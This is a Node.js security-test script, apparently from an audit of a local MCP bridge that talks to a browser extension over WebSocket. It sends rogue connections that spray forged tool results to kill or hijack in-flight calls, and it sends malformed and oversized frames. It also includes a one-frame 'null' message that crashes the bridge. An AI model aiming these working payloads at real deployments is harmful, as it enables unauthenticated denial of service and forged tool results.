// adv-03c-ws.mjs — round 3 (crash test LAST so it doesn't block the rest):
//  1) deterministic in-flight-call kill/forge vs real extension socket
//  2) ws frame-level violations (unmasked frame, >100MiB maxPayload)
//  3) ping/pong, hello
//  4) RE-CONFIRM: single 'null' text frame crashes the bridge
import WebSocket from 'ws';
import net from 'node:net';

const BASE = 'http://127.0.0.1:7890';
const MCP = BASE + '/mcp';
const WS_URL = 'ws://127.0.0.1:7890/ws';
const MARK = 'BLAST-' + Math.random().toString(36).slice(2, 8);

const findings = [];
const note = (sev, title, detail) => { findings.push({ sev, title }); console.log(`  [${sev}] ${title}\n      ${detail}`); };
const ok = (m) => console.log(`  PASS ${m}`);
const bad = (m) => console.log(`  FAIL ${m}`);
const sleep = (ms) => new Promise(r => setTimeout(r, ms));
const status = async () => { try { return await (await fetch(BASE + '/')).json(); } catch { return null; } };

const openSockets = new Set();
function wsConnect(headers = {}, { timeout = 4000 } = {}) {
  return new Promise((resolve) => {
    let done = false;
    const ws = new WebSocket(WS_URL, { headers });
    openSockets.add(ws);
    ws.on('error', () => {});
    const fin = (r) => { if (!done) { done = true; resolve(r); } };
    const t = setTimeout(() => fin({ ws, opened: false, err: 'timeout' }), timeout);
    ws.on('open', () => { clearTimeout(t); fin({ ws, opened: true }); });
    ws.on('error', (e) => { clearTimeout(t); fin({ ws, opened: false, err: e.message }); });
  });
}
async function rpc(body, sid, timeoutMs = 25000) {
  const ac = new AbortController();
  const t = setTimeout(() => ac.abort(), timeoutMs);
  try {
    const res = await fetch(MCP, {
      method: 'POST', signal: ac.signal,
      headers: { 'content-type': 'application/json', 'accept': 'application/json, text/event-stream', ...(sid ? { 'mcp-session-id': sid } : {}) },
      body: JSON.stringify(body),
    });
    const text = await res.text();
    const msgs = text.split('\n').filter(l => l.startsWith('data:')).map(l => { try { return JSON.parse(l.slice(5).trim()); } catch { return null; } }).filter(Boolean);
    return { msgs, sid: res.headers.get('mcp-session-id'), status: res.status, timeout: false };
  } catch (e) {
    return { msgs: [], sid: null, status: -1, timeout: e.name === 'AbortError', err: e.message };
  } finally { clearTimeout(t); }
}
async function initSession() {
  const r = await rpc({ jsonrpc: '2.0', id: 1, method: 'initialize', params: { protocolVersion: '2025-03-26', capabilities: {}, clientInfo: { name: 'adv-03c', version: '0' } } });
  if (r.sid) await rpc({ jsonrpc: '2.0', method: 'notifications/initialized' }, r.sid);
  return r.sid;
}
async function callTool(sid, name, args = {}, timeoutMs = 25000) {
  const r = await rpc({ jsonrpc: '2.0', id: Math.floor(Math.random() * 1e9), method: 'tools/call', params: { name, arguments: args } }, sid, timeoutMs);
  const m = r.msgs[r.msgs.length - 1];
  const res = m?.result;
  const text = res?.content?.[0]?.text ?? (m?.error ? 'RPC-ERR ' + m.error.message : r.timeout ? 'CLIENT-TIMEOUT' : 'EMPTY status=' + r.status);
  return { text, res, timeout: r.timeout, raw: m };
}
async function waitForBridge(maxMs = 60000) {
  const t0 = Date.now();
  while (Date.now() - t0 < maxMs) { if (await status()) return Date.now() - t0; await sleep(500); }
  return -1;
}
async function waitForExtension(maxMs = 25000) {
  const t0 = Date.now();
  while (Date.now() - t0 < maxMs) {
    const s = await status();
    if (s?.extensionConnected) return Date.now() - t0;
    await sleep(300);
  }
  return -1;
}

if (!(await status())) { console.log('bridge down at start'); process.exit(2); }

// =================================================================
console.log('\n== C3. Deterministic: rogue connect kills/forges in-flight call on REAL socket ==');
{
  const w = await waitForExtension();
  if (w < 0) { bad('extension not connected — skip'); } else {
    const sid = await initSession();
    const lp = await callTool(sid, 'list_pages', {}, 8000);
    const items = lp.res?.structuredContent?.items || lp.res?.structuredContent || [];
    const pid = items[0]?.pageId;
    console.log(`  pageId=${pid}`);
    const tally = { forged: 0, killed: 0, realResult: 0, timeout: 0 };
    for (let round = 0; round < 3; round++) {
      await waitForExtension();
      const p = callTool(sid, 'wait_for', { pageId: pid, time: 6000, timeout: 12000 }, 30000);
      await sleep(400); // call is now pending ON THE REAL extension socket
      const rogue = await wsConnect();
      if (rogue.opened) {
        try { for (let i = 1; i <= 600; i++) rogue.ws.send(JSON.stringify({ type: 'result', id: i, ok: true, data: { forged: MARK } })); } catch {}
      }
      const r = await p;
      if (r.text.includes(MARK)) { tally.forged++; }
      else if (/disconnected/i.test(r.text)) tally.killed++;
      else if (r.timeout) tally.timeout++;
      else { tally.realResult++; console.log(`    round ${round} real: ${r.text.slice(0, 90)}`); }
      try { rogue.ws.close(); } catch {}
      await sleep(300);
    }
    note(tally.forged ? 'CRIT' : 'HIGH', `in-flight interference: ${JSON.stringify(tally)}`,
      'a single rogue /ws connect deterministically kills in-flight calls on the real extension (close handler flushes ALL pending); blind id-spray forge needs to beat the flush');
  }
}

// =================================================================
console.log('\n== E3. Frame-level violations & misc ==');
{
  const r = await wsConnect();
  if (r.opened) {
    const closed = new Promise(res => r.ws.on('close', (code) => res(code)));
    r.ws._socket.write(Buffer.from([0x09, 0x00])); // unmasked ping — RFC violation
    const code = await Promise.race([closed, sleep(2500).then(() => -1)]);
    note(code === 1002 ? 'INFO' : 'LOW', 'unmasked client frame → close ' + code, code === 1002 ? 'protocol error handled, ws.on(error) swallows silently (no log)' : 'unexpected handling');
  }
  {
    const r2 = await wsConnect();
    if (r2.opened) {
      const closed = new Promise(res => r2.ws.on('close', (code) => res(code)));
      try { r2.ws.send(Buffer.alloc(110 * 1024 * 1024)); } catch {}
      const code = await Promise.race([closed, sleep(5000).then(() => -1)]);
      note(code === 1009 ? 'INFO' : 'MED', '110MiB message → close ' + code, 'ws default maxPayload=100MiB; large msgs parsed fully by JSON.parse — memory churn');
    }
  }
  {
    const r3 = await wsConnect();
    if (r3.opened) {
      let pong = null;
      r3.ws.on('message', (raw) => { try { const m = JSON.parse(raw.toString()); if (m.type === 'pong') pong = true; } catch {} });
      r3.ws.send(JSON.stringify({ type: 'ping' }));
      await sleep(300);
      ok(`ping->pong=${pong === true}; non-JSON/primitive/array/call/hello msgs ignored (verified round 1-2)`);
      r3.ws.close();
    }
  }
  const s = await status();
  ok('bridge still alive after frame violations: ' + !!s);
}

// =================================================================
console.log('\n== KILL. Re-confirm: single "null" text frame crashes bridge ==');
{
  const s = await status();
  console.log(`  pre-kill: extensionConnected=${s?.extensionConnected} sessions=${s?.sessions}`);
  const r = await wsConnect();
  if (r.opened) {
    r.ws.send('null'); // JSON.parse ok -> msg=null -> msg.type -> TypeError -> uncaught -> exit
    await sleep(500);
    const s2 = await status();
    if (!s2) note('CRIT', 'single 4-byte "null" WS frame CRASHED the bridge', 'unauthenticated remote DoS — JSON.parse succeeds, null.type throws TypeError (index.js ~line 128-129), no try/catch around msg access');
    else bad('bridge survived null frame?? ' + JSON.stringify(s2));
    // downtime measurement
    const back = await waitForBridge(60000);
    console.log(back >= 0 ? `  bridge back after ${back}ms (external restart)` : '  bridge still down after 60s');
  }
}

console.log(`\n===== ${findings.length} findings =====`);
findings.forEach((f, i) => console.log(`  ${i + 1}. [${f.sev}] ${f.title}`));
setTimeout(() => process.exit(0), 300).unref();
